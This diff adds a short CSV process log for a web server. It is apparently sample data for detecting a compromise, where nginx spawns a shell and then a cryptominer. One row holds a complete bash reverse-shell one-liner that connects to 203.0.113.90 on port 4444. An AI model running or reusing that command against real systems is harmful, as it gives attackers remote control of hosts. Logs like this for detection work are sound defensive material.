@@ -1,0 +1,6 @@
+time,host,parent_process,child_process,dest_ip
+2026-09-28T10:00:01,web01,systemd,nginx,-
+2026-09-28T10:04:12,web01,nginx,php-fpm,-
+2026-09-28T10:07:45,web01,nginx,/bin/bash -c "bash -i >& /dev/tcp/203.0.113.90/4444 0>&1",203.0.113.90
+2026-09-28T10:12:33,web01,bash,xmrig,45.146.164.20
+2026-09-28T10:20:02,web01,cron,backup.sh,-
